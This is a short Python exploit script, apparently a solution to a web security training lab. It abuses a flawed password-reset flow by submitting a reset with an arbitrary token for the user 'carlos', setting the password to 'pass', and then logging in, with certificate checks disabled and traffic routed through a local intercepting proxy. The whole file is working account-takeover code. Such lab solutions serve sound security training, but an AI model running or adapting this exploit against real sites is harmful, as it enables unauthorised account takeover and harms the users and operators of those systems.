import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

def access_carlos_account(url):
    # Reset carlos's password
    sess = requests.session()
    print("(+) Resetting Carlos's password...")
    password_reset_url = url + "/forgot-password?temp-forgot-password-token=E"
    password_reset_data = {"temp-forgot-password-token": "E", "username": "carlos", "new-password-1": "pass", "new-password-2": "pass"}
    sess.post(password_reset_url, data=password_reset_data, verify=False, proxies=proxies)

    # Access Carlos's account
    print("(+) Logging into Carlos's account...")
    login_url = url + "/login"
    login_data = {"username": "carlos", "password": "pass"}
    res = sess.post(login_url, data=login_data, verify=False, proxies=proxies)

    # Confirm exploit worked
    if "Log out" in res.text:
        print("(+) Successfully logged into Carlos's account.")
    else:
        print("(-) Exploit failed.")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: {sys.argv[0]} <url>")
        print(f"(+) Example: {sys.argv[0]} https://example.com")
        sys.exit(-1)

    url = sys.argv[1]
    access_carlos_account(url)

if __name__ == "__main__":
    main()